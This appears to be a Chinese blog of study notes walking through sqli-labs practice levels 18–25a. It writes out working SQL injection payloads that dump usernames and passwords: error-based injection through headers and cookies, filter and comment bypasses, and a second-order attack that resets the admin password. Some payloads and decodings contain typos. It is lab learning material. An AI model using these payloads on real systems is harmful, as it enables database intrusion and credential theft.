<p>SELECT username, password FROM users：从users表中查询username和password字段。<br>(……)text：这是一个派生表（子查询的结果被当作一个临时表），命名为text。派生表的作用是绕过某些SQL注入场景中对直接查询表的限制。<br>concat_ws(‘:’, username, password)：将username和password字段用冒号（:）拼接成一个字符串，例如admin:password123。<br>LIMIT 0,1：限制查询结果只返回第一行数据。<br>作用：<br>从users表中提取用户名和密码，并将它们拼接成一个字符串，作为updatexml()函数的第二个参数。  </p>
</blockquote>
<p>执行过程：  </p>
<blockquote>
<p>闭合原语句并注入逻辑： OR操作使得注入的语句能够被执行。<br>查询数据： 从users表中提取用户名和密码，并拼接成一个字符串。<br>触发报错： 将拼接后的字符串作为updatexml()的第二个参数，触发报错。<br>泄露数据： 报错信息中会包含拼接后的字符串，从而泄露用户名和密码。<br>返回结果：<br>当这个注入语句执行时，MySQL会返回一个错误信息，类似如下：<br>XPATH syntax error: ‘!admin:password123’<br>从这个错误信息中，我们可以提取出admin:password123，从而获取到用户名和密码。</p>
</blockquote>
<h2 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h2><p>不想看了，反正先知道有这个group by报错注入</p>
<h2 id="函数说明-错误说明"><a href="#函数说明-错误说明" class="headerlink" title="函数说明,错误说明"></a>函数说明,错误说明</h2><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><p>语法：concat_ws(separator, str1, str2, …, strN)<br>功能：将两个或多个字符串用指定的分隔符连接起来，返回连接后的字符串。<br>特点：<br>第一个参数是分隔符，后续参数是要连接的字符串。<br>如果分隔符为 NULL，则结果为 NULL。<br>如果某个字符串为 NULL，则在连接时会跳过该字符串。  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;邮箱&#x27;</span>);<br><span class="hljs-comment">-- 结果：用户名:密码:邮箱</span><br></code></pre></td></tr></table></figure>

<h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><blockquote>
<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# </p>
</blockquote>
<p>回显  </p>
<blockquote>
<p>Incorrect parameter count in the call to native function ‘extractvalue’</p>
</blockquote>
<p>KIMI：<br>出现这个错误是因为extractvalue()函数的参数数量不正确。extractvalue()函数在mysql中用于从xml数据中提取值，它的语法是：  </p>
<blockquote>
<p>extractvalue(xml_target, xpath_expression)  </p>
</blockquote>
<p>它只接受两个参数：<br>xml_target：要从中提取值的xml数据。<br>xpath_expression：用于定位xml数据中特定节点的xpath表达式。<br>而在你的payload中：  </p>
<blockquote>
<p>extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)  </p>
</blockquote>
<p>你传递了三个参数给extractvalue()函数，这显然不符合它的定义，因此mysql会报错，提示参数数量不正确。<br>正确的用法示例<br>如果你想使用extractvalue()函数来进行sql注入并获取数据，可以参考以下payload：  </p>
<blockquote>
<p>1’ and extractvalue(1, concat(0x7e,(select group_concat(id,username,password) from users),0x7e))#  </p>
</blockquote>
<p>这里只传递了两个参数给extractvalue()函数，符合它的定义，因此不会出现参数数量错误的问题。</p>
<h3 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">(... ...)word<br>(<span class="hljs-selector-tag">SELECT</span> username, password <span class="hljs-selector-tag">FROM</span> users)<span class="hljs-selector-tag">text</span> #为派生表<span class="hljs-selector-tag">text</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-10date-2025-03-10-21-45-47tags-sql-labs"><a href="#title-note-10date-2025-03-10-21-45-47tags-sql-labs" class="headerlink" title="title: note-10date: 2025-03-10 21:45:47tags: sql-labs"></a>title: note-10<br>date: 2025-03-10 21:45:47<br>tags: sql-labs</h2><h1 id="less18-可能是叫做报头注入"><a href="#less18-可能是叫做报头注入" class="headerlink" title="less18 可能是叫做报头注入"></a>less18 可能是叫做报头注入</h1><p>在有头部回显的状况下用  </p>
<p>如图payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(database())),1),2,3)#<br></code></pre></td></tr></table></figure>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/1.png" srcset="/img/loading.gif" lazyload alt="1">  </p>
<p>因为源码里有检查三个参数，所以要输入三个参数，或者用</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br>```  <br>闭合，此时后端代码就会变成<br>```sql<br>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27;, &#x27;$IP&#x27;, $uname)&quot;;<br></code></pre></td></tr></table></figure>
<p>前后两端的’是为了闭合原有的单引号中间用and，or等连接即可。</p>
<blockquote>
<p>闭合单引号：通过’闭合原SQL语句中的单引号，确保语法正确。  </p>
</blockquote>
<blockquote>
<p>使用or：or用于确保即使原语句的条件不成立，我们的注入语句仍然会被执行。  </p>
</blockquote>
<blockquote>
<p>注入extractvalue()：extractvalue()函数被用来触发报错，concat(0x7e,database())将数据库名称与一个波浪号（0x7e是波浪号的十六进制表示）拼接，从而在报错信息中回显出数据库名称。  </p>
</blockquote>
<blockquote>
<p>闭合表达式：通过or ‘’闭合整个表达式，确保语法正确。  </p>
</blockquote>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/2.png" srcset="/img/loading.gif" lazyload alt="2">  </p>
<p>最终payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(&#x27;!&#x27;,(select concat(username,<span class="hljs-number">2</span>,password)from users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br><br><span class="hljs-attribute">User</span>-Agent: &#x27; or extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure>
<p>为什么要用 or 或 and 连接:</p>
<p>因为使用了报错注入，所以需要使用or或and来闭合原语句并插入的注入语句。</p>
<h1 id="less19-头部注入-Referer"><a href="#less19-头部注入-Referer" class="headerlink" title="less19 头部注入-Referer"></a>less19 头部注入-Referer</h1><p>后端可以注入的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>相比上一关只有两个参数，所以可以这样</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(databass())),1),2)#  //爆数据库<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;security&#x27;)),1),2)#  //爆表名<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(column_name)from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27; limit 0,1)),1),2)#   <br>//分段回显<br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or updatexml(1,concat(&#x27;!&#x27;,(select concat(id,username,&#x27;!&#x27;,password)from users limit 0,1)),1),2)#<br>//最后一行行爆<br></code></pre></td></tr></table></figure>

<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/3.png" srcset="/img/loading.gif" lazyload alt="3"><br>也可以这样</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;<br></code></pre></td></tr></table></figure>

<h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>题目提示cookie注入，登录正确的账户名出现以下界面<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/4.png" srcset="/img/loading.gif" lazyload alt="4"><br>表头如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-20/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-20/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=admin<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>cookie只有一个unmae？<br>尝试在uname注入<br><img src="http://39.105.15.250/aidemofashi_home/img/note-10/5.png" srcset="/img/loading.gif" lazyload alt="5">  </p>
<p>发现注入点</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">Cookie: uname=&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(id,username,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>

<p>可能是该后端代码造成了注入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;$cookee&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure>
<p><img src="http://39.105.15.250/aidemofashi_home/img/note-10/6.png" srcset="/img/loading.gif" lazyload alt="6">  </p>
<hr>
<h2 id="title-note-11date-2025-03-12-16-19-54tags-sql-labs"><a href="#title-note-11date-2025-03-12-16-19-54tags-sql-labs" class="headerlink" title="title: note-11date: 2025-03-12 16:19:54tags: sql-labs"></a>title: note-11<br>date: 2025-03-12 16:19:54<br>tags: sql-labs</h2><h1 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h1><p>根据题目提示先登正确账户密码吗，然后bp抓包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli-labs/Less-21/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/sqli-labs/Less-21/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure>
<p>看到cookie中uname明显不是用来登录的admin,是admin经过base64加密后的字符</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=YWRtaW4%3D<br></code></pre></td></tr></table></figure>
<p>用赛博厨子解出来尽然是</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4%3D<br>decode base64=<br>admin7<br></code></pre></td></tr></table></figure>
<p>怀疑是后面%3D是url字符，<br>将构建好的闭合点加密成base64后再上传</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">YWRtaW4n<br>回显<br>Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br></code></pre></td></tr></table></figure>
<p>最后测出闭合语句</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">uname=YWRtaW4nKSM=<br>base解码就是<br>uname=admin&#x27;)#<br></code></pre></td></tr></table></figure>
<p>最后payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoaWQsdXNlcm5hbWUsJyEnLHBhc3N3b3JkKSBmcm9tIHVzZXJzIw==<br></code></pre></td></tr></table></figure>

<h1 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h1><p>和上题解法一样，就是换了闭合点   </p>
<p>最终payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uname=IiB1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChpZCx1c2VybmFtZSwnIScscGFzc3dvcmQpIGZyb20gdXNlcnMj<br></code></pre></td></tr></table></figure>

<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>看题目，<br>strip comment,看翻译是删除注释，不懂啥意思<br>看一眼网页源码，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">reg = <span class="hljs-string">&quot;/#/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">reg1 = <span class="hljs-string">&quot;/--/&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">replace = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash"><span class="hljs-built_in">id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><br></code></pre></td></tr></table></figure>
<p>闭合点是’<br>但好像把#,–,这种注释给替换成空字符了，<br>有没有不用注释的方法呢，<br>注释的作用是把后面的语句无效化。<br>那试试绕过？双写绕过试试？<br>不行，实在试不出来，去看博客吧  </p>
<h2 id="采用闭合的方式："><a href="#采用闭合的方式：" class="headerlink" title="采用闭合的方式："></a>采用闭合的方式：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;</span> <br></code></pre></td></tr></table></figure>
<p>好像是拼入源码会变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
<p>对比</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select #&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">//若此出注释符被过滤,则会多出一个单引号导致无法注入</span><br><span class="hljs-comment">//被过滤后的结果</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;&#x27;union select&#x27; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="采用-00替换注释"><a href="#采用-00替换注释" class="headerlink" title="采用;%00替换注释"></a>采用;%00替换注释</h2><p>采用;%00替换注释：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27;;<span class="hljs-comment">%00</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>%00 是 URL 编码的空字符（\x00）  </p>
</blockquote>
<p>组合 ;%00 的完整逻辑<br>攻击者通过 ;%00 实现以下目标：</p>
<blockquote>
<p>结束当前语句：分号 ; 终止 UNION SELECT 查询。</p>
</blockquote>
<blockquote>
<p>截断后续内容：空字符 %00 让后端忽略原查询中可能存在的其他条件（如 LIMIT 1 或 AND 子句）。</p>
</blockquote>
<blockquote>
<p>绕过闭合引号：如果原查询的闭合引号在空字符后被截断，可能避免语法错误。</p>
</blockquote>
<p>最后payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-string">&#x27; union select 1,2,group_concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users;%00</span><br></code></pre></td></tr></table></figure>

<h1 id="less-24-二次注入"><a href="#less-24-二次注入" class="headerlink" title="less 24 二次注入"></a>less 24 二次注入</h1><blockquote>
<p>二次注入<br>二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。</p>
</blockquote>
<h2 id="看别的大佬博客"><a href="#看别的大佬博客" class="headerlink" title="看别的大佬博客"></a>看别的大佬博客</h2><p>在注册新用户中注册已有的用户名会提示不行，但是username没有被过滤，可从username下手。   </p>
<p>我们先注册一个账号名叫admin’#。可以看到我们成功将有污染的数据写入数据库。单引号是为了和之后密码修的用户名的单引号进行闭合，#是为了注释后面的数据。</p>
<p>之后也用户名admin’#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。  </p>
<p>当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。  </p>
<blockquote>
<p>我的总结理解是在注册新用户时把有污染的数据写入数据库，当再修改admin’#时会直接把admin’#拼入修改的查询语句，而注释掉了原来验证原账号密码的部分</p>
</blockquote>
<p>原语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure>
<p>当登录admin’#并点修改密码时会出现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;1234&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span><br></code></pre></td></tr></table></figure>
<p>这样就会变成修改admin的密码而不是admin’#的，并且会将后面验证admin密码的部分注释掉。</p>
<hr>
<h2 id="title-note-12date-2025-03-13-18-58-13tags-sql-labs"><a href="#title-note-12date-2025-03-13-18-58-13tags-sql-labs" class="headerlink" title="title: note-12date: 2025-03-13 18:58:13tags: sql-labs"></a>title: note-12<br>date: 2025-03-13 18:58:13<br>tags: sql-labs</h2><h1 id="less-25-字符过滤绕过"><a href="#less-25-字符过滤绕过" class="headerlink" title="less-25 字符过滤绕过"></a>less-25 字符过滤绕过</h1><p>由题目可知道过滤了or和and，大小写没用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);			<span class="hljs-comment">//strip out OR (non case sensitive)</span><br>	<span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);		<span class="hljs-comment">//Strip out AND (non case sensitive)</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>i表示不敏感大小写，这样的话想用报错注入就要进行绕过了  </p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">and可以用<span class="hljs-meta">&amp;&amp;</span><br>or可以用<span class="hljs-string">||</span><br></code></pre></td></tr></table></figure>

<p>也有双写绕过</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">输入<br>oorr<br>进行过滤后会变成<br><span class="hljs-keyword">or</span><br><span class="hljs-keyword"></span>实现绕过<br><br>同理<br>输入aandnd<br>经过过滤变成<br><span class="hljs-keyword">and</span><br></code></pre></td></tr></table></figure>

<p>当然可以直接用联合注入法：<br>注意要绕过字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+<br><br>?id=&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; aandnd table_schema=&#x27;security&#x27;--+<br><br>information要换成infoorrmation。<br>and要换成&amp;&amp;或者aandnd。<br></code></pre></td></tr></table></figure>
<p>最后payload</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,username,&#x27;!&#x27;,passwoorrd) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+</span><br><br>passsword要换成passwoord<br></code></pre></td></tr></table></figure>
<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>要求使用盲注，而且像上题一样过滤or和and，<br>测试了好一会，发现根本不需要闭合  </p>
